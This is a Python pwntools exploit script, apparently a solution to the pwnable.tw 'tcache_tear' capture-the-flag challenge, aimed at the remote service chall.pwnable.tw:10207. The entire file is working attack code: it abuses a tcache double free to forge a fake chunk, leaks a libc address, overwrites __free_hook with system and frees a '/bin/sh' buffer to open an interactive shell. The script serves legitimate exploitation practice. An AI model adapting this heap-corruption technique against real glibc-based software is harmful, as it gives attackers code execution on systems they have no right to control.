from pwn import *

#sh = process(b"./tcache_tear_patched")
#gdb.attach(sh)
sh = remote("chall.pwnable.tw", 10207)

fake_chunk         = 0x602060
system_libc        = 0x4f440
__free_hook_libc   = 0x3ed8e8

def start(name):
    sh.sendlineafter(b"Name:", name)
    sh.recvuntil(b"Your choice :")

def malloc(size, data):
    sh.sendline(b"1")
    sh.sendlineafter(b"Size:", size)
    sh.sendlineafter(b"Data:", data)
    sh.recvuntil(b"Your choice :")

def free():
    sh.sendline(b"2")
    #print(sh.recvuntil(b"Your choice :"))
    sh.recvuntil(b"Your choice :", timeout=3)
        
def info():
    sh.sendline(b"3")
    return sh.recvuntil(b"Your choice :")
def exit():
    sh.sendline(b"4")

start(p64(0x00)+p64(0x431)) 

malloc(b"8", b"UnknownD4")        
free()
free()
malloc(b"8", p64(fake_chunk+16))  
malloc(b"8", b"UnknownD4")
malloc(b"8", p64(0x00)*3 + p64(fake_chunk+16) + b"\0"*1024
           + p64(0x430)  + p64(0x21)          + b"\0"*16 
           + p64(0x20)   + p64(0x21) 
)
free()

libc_leak           = u64(info().split(b"$$$")[0].split(b"\0\0")[7]+b'\0\0') - 0x3ebca0
__free_hook_libc += libc_leak
system_libc        += libc_leak
malloc(b"80", b"UnknownD4")
free()
free()
malloc(b"80", p64(__free_hook_libc))
malloc(b"80", b"UnknownD4")
malloc(b"80", p64(system_libc))
malloc(b"1", b"/bin/sh\0")
free()                           
sh.interactive()